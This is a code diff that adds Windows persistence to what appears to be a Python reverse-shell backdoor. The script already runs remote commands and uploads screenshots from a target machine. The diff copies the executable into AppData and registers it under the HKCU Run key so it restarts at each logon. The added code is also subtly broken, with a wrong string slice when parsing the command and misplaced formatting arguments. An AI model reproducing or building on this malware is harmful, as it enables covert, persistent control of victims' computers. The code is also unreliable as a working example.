@@ -4,6 +4,9 @@ import subprocess
 import os
 import termcolor
 import pyautogui
+import shutil
+import sys
+import subprocess
 
 def reliable_send(data):
     jsondata = json.dumps(data)
@@ -39,6 +42,19 @@ def screenshot():
     my_screenshot = pyautogui.screenshot()
     my_screenshot.save('screen.png')
 
+def persist(reg_name, copy_name):
+    file_location = os.environ['appdata'] + '\\' + copy_name
+    try:
+        if not os.path.exists(file_location):
+            shutil.copyfile(sys.executable, file_location)
+            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v ' + reg_name + ' /t REG_SZ /d "' + file_location + '"', shell=True)
+            reliable_send(termcolor.colored('[+] Created Persistence with Reg Key: ' + reg_name),'green', attrs=['bold'])
+        else:
+            reliable_send(termcolor.colored('[+] Persistence Already Exists','green', attrs=['bold']))
+    except:
+        reliable_send(termcolor.colored('[+] Error Creating Persistence with the target machine'), 'red', attrs=['bold'])
+
+
 def shell():
     while True:
         command = reliable_recv()
@@ -58,6 +74,9 @@ def shell():
             screenshot()
             upload_file('screen.png')
             os.remove('screen.png')
+        elif command[:11] == 'persistence':
+            reg_name, copy_name = command[:12].split(' ')
+            persist(reg_name,  copy_name)
         else:
             execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
             result = execute.stdout.read() + execute.stderr.read()
